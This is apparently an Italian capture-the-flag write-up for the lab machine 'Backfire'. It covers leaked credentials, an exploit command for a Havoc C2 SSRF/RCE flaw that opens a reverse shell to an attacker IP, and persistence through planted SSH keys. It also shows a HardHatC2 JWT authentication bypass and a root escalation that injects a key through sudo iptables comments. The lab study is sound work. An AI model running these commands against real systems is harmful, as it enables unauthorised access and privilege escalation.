+++
date = '2026-05-20T19:40:31+02:00'
draft = false
title = 'Backfire Writeup IT'
+++
**Nome:** `joy.scd01`

**Data:** `24/01/2025`

![Backfire.png](/images/imgs_backfire/Backfire.png)

---
# Introduzione

**_Backfire_** è la seconda macchina rilasciata durante la **stagione 7**.
È una macchina **Linux**, ufficialmente classificata come **difficoltà Medium**.
Secondo me non lo è affatto... l'ho trovata un vero brainfuck, perchè mi sono bloccato più volte cercando online il giusto exploit da usare.

Sia l'accesso iniziale che le fasi di privilege escalation richiedono infatti l'utilizzo di exploit precisi che concatenano lo sfruttamento di più vulnerabilità interagendo con i framework.
A questo si aggiunge il **pivoting** necessario per il movimento laterale e il risultato è una macchina molto più intricata di una normale "**Medium**".

---
# Tecniche Utilizzate

- **SSRF combinata con RCE (CVE-2024-41570)**
- **Authentication Bypass (manipolazione di JWT)**
- **Sudoers Misconfiguration (iptables)**

---
# Enumerazione

## nmap

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV backfire
```

![nmap.png](/images/imgs_backfire/nmap.png)

**Porte Aperte**:
- **22/tcp** ---> SSH
- **443/tcp** ---> ssl/http running nginx/1.22.1
- **5000/tcp** ---> filtered upnp
- **8000/tcp** ---> http running nginx 1.22.1

---
## HTTP - Enumerazione Web | http://backfire:8000

Qui è possibile scaricare **due file interessanti**:

![web.png](/images/imgs_backfire/web.png)

1. **`disable_tls.patch`**:

![tls_d.png](/images/imgs_backfire/tls_d.png)

2. **`havoc.yaotl`**:

![havoc.png](/images/imgs_backfire/havoc.png)


Analizzando il primo file si deduce che il **Framework Havoc C2** è in esecuzione su **localhost:40056**

Nel secondo file sono presenti delle credenziali:

- `ilya`:**CobaltStr1keSuckz!**
- `sergej`:**1w4nt2sw1tch2h4rdh4tc2**

Ho provato un semplice login **SSH**, ma ovviamente non ha funzionato.

Ho quindi cercato online un exploit per **Havoc** e ho trovato questo:
https://github.com/kit4py/CVE-2024-41570.

Una **SSRF** + **RCE**.

_Una vulnerabilità di **Request Forgery lato server non autenticata** nella gestione del daemon di Havoc, combinata con una **Remote Code Execution** che consente di stabilire una **reverse shell**.
Lo script automatizza: **la registrazione dell'agent, l'invio del payload via WebSocket e l'esecuzione remota di comandi**_

Utilizzare questo exploit è stato il passo chiave per ottenere l'**accesso iniziale** sulla macchina.

---
# Accesso Iniziale | SSRF combinata con RCE

Dopo aver avviato un **netcat** listener, ho lanciato l’exploit:

```bash
python3 exploit.py -t https://backfire -i 127.0.0.1 -p 40056 -U 'ilya' -P 'CobaltStr1keSuckz!' -l <attacker_IP> -L <lport>
```

![cve1.png](/images/imgs_backfire/cve1.png)

Dopo un po’, ho ottenuto una shell come utente **`ilya`**:

![ilyashell.png](/images/imgs_backfire/ilyashell.png)

La shell era poco stabile, quindi ho aggiunto la mia **chiave RSA pubblica** al file `authorized_keys` per stabilizzarla e ottenere persistenza.

Una volta collegato via **SSH** con una shell interattiva stabile, ho trovato la **user flag** e ho iniziato la fase di **privilege escalation**.

![stableshell.png](/images/imgs_backfire/stableshell.png)

---
# Movimento Laterale | Pivoting → Authentication Bypass via JWT → sergej

Per continuare la privesc ho iniziato ad analizzare le directory interne.

Nella home di **`ilya`** ho trovato un file interessante: **`hardhat.txt`**

![hardhat.png](/images/imgs_backfire/hardhat.png)

Ho cercato informazioni su **HardHatC2** e ho trovato questo exploit:
https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7

Una vulnerabilità di **Authentication Bypass**.

_In poche parole, l’exploit permette di **bypassare l’autenticazione** di HardHat creando un **JWT admin** e usando quel token per creare un nuovo utente **(`sth_pentest`)** con ruolo **TeamLead**._

Prima di usarlo, ho controllato i **servizi interni**:

```bash
ilya@backfire:~$ netstat -tuln
```

![tuln.png](/images/imgs_backfire/tuln.png)

Le porte **5000** e **7096** hanno catturato la mia attenzione e, dato che la **5000** risultava filtrata dall'output dello scan iniziale fatto con **nmap**, ho testato la **7096**:

```bash
curl -k https://127.0.0.1:7096
```

Questo mi ha restituito il contenuto della pagina web di **HardHatC2**.

Ho quindi creato un **tunnel SSH**:

```bash
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i ~/.ssh/id_ed25519 ilya@backfire -L 7096:localhost:7096
```

E ho eseguito l'**exploit**:

```bash
python3 gen.py
```

![jwt.png](/images/imgs_backfire/jwt.png)

**Ha funzionato.**

Ora potevo loggarmi nell’interfaccia web di HardHat su: **https://localhost:7096** con le **credenziali**:

- `sth_pentest:sth_pentest`

Non avendo mai usato HardHat, ho iniziato ad esplorare ogni pagina dell’interfaccia.

Nella sezione **`/ImplantInteract`** ho trovato una **webshell** interattiva come utente **`sergej`**:

![term.png](/images/imgs_backfire/term.png)

Come fatto in precedenza, ho aggiunto la mia **chiave RSA** in `authorized_keys` per ottenere una connessione stabile via **SSH**.

![authj.png](/images/imgs_backfire/authj.png)

![sergejshell.png](/images/imgs_backfire/sergejshell.png)

---
# Privilege Escalation | Sudo Misconfiguration → Privilege Escalation Locale tramite iptables

Dai **permessi sudo** risultava che `sergej` poteva eseguire **iptables** senza password:

![sudol.png](/images/imgs_backfire/sudol.png)

Cercando informazioni su “**/usr/sbin/iptables privilege escalation**” ho trovato questo blog:
https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/

Ho quindi usato questa tecnica per sovrascrivere la mia **chiave SSH pubblica** nel file `authorized_keys` di **root**.

Comandi usati:

1.  Ho usato la flag "**comment**" per inserire la chiave come commento in una regola **iptables**:
```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n <YourPubKey> \n'
```

2. Ho usato la flag "**-S**" per stampare la regola convertendo **`\n`** in una nuova riga:
```bash
sudo iptables -S
```

3. Ho usato il comando "**iptables-save**" per salvare le regole sovrascrivendo `authorized_keys`:

![privesc.png](/images/imgs_backfire/privesc.png)

A questo punto mi sono connesso via **SSH come root** usando la mia chiave:

![root.png](/images/imgs_backfire/root.png)

---
# Conclusioni Finali

_Backfire_ si è rivelata molto più lunga del previsto, non tanto per la complessità delle tecniche, quanto per il fatto che ogni fase richiedeva di trovare **l’exploit giusto**, spesso molto specifico.

La parte più difficile è stata proprio la ricerca, la verifica e l’adattamento di exploit pubblici.
È questo che ha reso la macchina frustrante.

Nonostante tutto, è stata utile per approfondire documentazione, testare approcci diversi e capire le basi di come funzionano davvero sia **Havoc** che **HardHatC2**.

**Fonti**:

- **Exploit Havoc (CVE-2024-41570)** | https://github.com/kit4py/CVE-2024-41570
- **Exploit HardHatC2 (Authentication Bypass)** | https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7
- **Guida alla Privilege Escalation tramite iptables** | https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/